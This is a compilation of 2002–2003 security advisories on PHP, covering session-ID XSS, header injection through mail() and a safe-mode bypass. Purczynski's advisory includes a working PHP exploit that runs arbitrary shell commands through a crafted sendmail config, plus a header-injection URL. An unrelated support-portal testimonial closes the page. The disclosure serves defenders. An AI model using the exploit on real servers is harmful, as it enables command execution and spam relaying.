Package:             php, apache
Vulnerability:       XSS; bypass safe mode
OpenPKG Specific:    no

OpenPKG CURRENT      <= php-4.3.1-20030516       >= php-4.3.2-20030529
                     <= apache-1.3.27-20030516   >= apache-1.3.27-20030529

Dependent Packages:  none

Description:
  A security advisory [[3]](#3) states that in PHP [[1]](#1) version 4.3.1 (but
  we at OpenPKG believe 4.2.x) and earlier, when transparent session
  ID support is enabled using the "session.use_trans_sid" option,
  the session ID is not escaped before use, which allows remote
  attackers to insert arbitrary script via the PHPSESSID parameter. The
  Common Vulnerabilities and Exposures (CVE) project assigned the id
  CAN-2003-0442 [[6]](#6) to this problem.

  Additionally, Wojciech Purczynski some time ago found out [[2]](#2) that
  it is possible to allow remote attackers to by-pass "safe mode"
  restrictions in PHP [[1]](#1) 4.x to 4.2.2 and modify command line arguments
  to the MTA (e.g. sendmail) in the 5th argument to mail(), altering MTA
  behavior and possibly executing commands. The Common Vulnerabilities
  and Exposures (CVE) project assigned the id CAN-2002-0985 [[4]](#4) to this
  problem.

  Wojciech Purczynski also reported [[2]](#2) that the mail function in
  PHP [[1]](#1) 4.x to 4.2.2 does not filter ASCII control characters from
  its arguments, which could allow remote attackers to modify mail
  message content, including mail headers, and possibly use PHP as a
  "spam proxy." The Common Vulnerabilities and Exposures (CVE) project
  assigned the id CAN-2002-0986 [[5]](#5) to this problem.

  Please check whether you are affected by running "<prefix>/bin/rpm
  -q php". If you have the "php" package installed and its version is
  affected (see above), we recommend that you immediately upgrade it
  (see Solution).

Solution:
  Select the updated source RPM appropriate for your OpenPKG release
  [[9]](#9), fetch it from the OpenPKG FTP service [[10]](#10) or a mirror location,
  verify its integrity [[11]](#11), build a corresponding binary RPM from
  it [[7]](#7) and update your OpenPKG installation by applying the binary
  RPM [[8]](#8). For the current release OpenPKG 1.2, perform the following
  operations to permanently fix the security problem (for other releases
  adjust accordingly).

  $ ftp ftp.openpkg.org
  ftp> bin
  ftp> cd release/1.2/UPD
  ftp> get php-4.2.2-1.1.2.src.rpm
  ftp> bye
  $ <prefix>/bin/rpm -v --checksig php-4.2.2-1.1.2.src.rpm
  $ <prefix>/bin/rpm --rebuild php-4.2.2-1.1.2.src.rpm
  $ su -
  # <prefix>/bin/rpm -Fvh <prefix>/RPM/PKG/php-4.2.2-1.1.2.*.rpm

## PHP fails to filter ASCII control characters from string arguments of mail() function

#### Vulnerability Note VU#410609

Original Release Date: 2002-09-16 | Last Revised: 2002-09-16

---

### Overview

PHP does not properly filter parameters to its mail() function.

### Description

| PHP is a scripting language widely used in web application development. PHP includes a function called mail() that takes message parameters such as recipient address and sends mail using sendmail. PHP does not filter these parameters for inappropriate characters, such as ASCII control characters. When such characters are passed to sendmail, the mail message may be altered and mail headers may be forged.  Documentation of the mail() function does not explain this risk to the developer and does not establish any responsibility on the script developer to filter message parameters before passing them to the mail() function. PHP should filter these characters or document script developers' responsibility to filter these parameters before calling mail(). |
| --- |

### Impact

| Through a PHP script that passes user input to the mail() function, attackers may be able to alter message headers and content. |
| --- |

### Solution

| The CERT/CC is currently unaware of a practical solution to this problem. |
| --- |

| **Filter parameters to mail() function**In email addresses, remove any characters not explicitly valid for email addresses. In other fields, use a similar technique based on valid characters for those parameters. |

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Product:	PHP
Version: 	4.x up to 4.2.2
Vendor:		<http://www.php.net/>
Author:		Wojciech Purczynski <cliph@isec.pl>
Date:		June 13, 2002
Updated:	August 23, 2002
Released:	August 21, 2002

Issue:
======

Two vulnerabilities exists in mail() PHP function. The first one allows to
execute any program/script bypassing safe_mode restriction, the second one
may give an open-relay script if mail() function is not carefully used in
PHP scripts.

Description:
============

PHP is a widely-used general-purpose scripting language that is especially
suited for Web development and can be embedded into HTML.

Details:
========

(1) Bypassing safe_mode restriction

If PHP is configured with safe_mode option enabled, special restriction
are set up including limit on external binaries that may be executed
from within a PHP script.

The 5th argument to the mail() function (introduced in version 4.0.5)
allow specifying command line option to the sendmail binary. Some time
ago a bug was found in the mail() function allowing to pass shell
meta-characters in the 5th argument, leading to execute arbitrary shell
commands or external binaries. This bug was fixed in version 4.1.0.

However, mail() function is still vulnerable because it allows to pass
command line arguments to the sendmail binary which gives the ability to
influence its behavior (i.e. by using non-default aliases, custom
configuration files - other cases are possible with others MTAs)

Passing 5th argument should be disabled if PHP is configured in safe_mode.

Exploit attached at the end.

(2) Injecting ASCII control characters into mail() arguments

Arbitrary ASCII control characters may be injected into string arguments
of mail() function. If mail() arguments are takeon from user's input it
may give the user ability to alter message content including mail
headers.

Example of such a vulnerability may be found on PHP.net site:

(URL wrapped for readability)
[http://www.php.net/mailing-lists.php?](http://www.php.net/mailing-lists.php)
	maillist=your@email.com%0a&email=fake@from.net%0a

PHP should do content filtering before creating message body sent
with "sendmail -t" command.

Impact:
=======

(1) Any user may bypass safe_mode restrictions if mail() function is not
    disabled.
(2) Open-relay PHP script if user's data is poorly or not filtered and
    passed to the mail() function.

Exploit:
========

Sample exploit for (1) that works with sendmail MTA:

- -----8<----- bypass_safe_mode.php -----8<-----
<?
$script=tempnam("/tmp", "script");
$cf=tempnam("/tmp", "cf");

$fd = fopen($cf, "w");
fwrite($fd, "OQ/tmp
Sparse=0
R$*" . chr(9) . "$#local $@ $1 $: $1
Mlocal, P=/bin/sh, A=sh $script");
fclose($fd);

$fd = fopen($script, "w");
fwrite($fd, "rm -f $script $cf; ");
fwrite($fd, $cmd);
fclose($fd);

mail("nobody", "", "", "", "-C$cf");
?>
- -----8<----- bypass_safe_mode.php -----8<-----

Fix:
====

(1) has been successfully fixed in the latest CVS snapshot. Fix for the
(2) is not sufficient and it is still possible to inject ASCII control
characters that causes argument string to be truncated. Please refer to
the example URL mentioned above.

These bugs haven't been fixed yet in the latest 4.2.2 stable release.

> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.
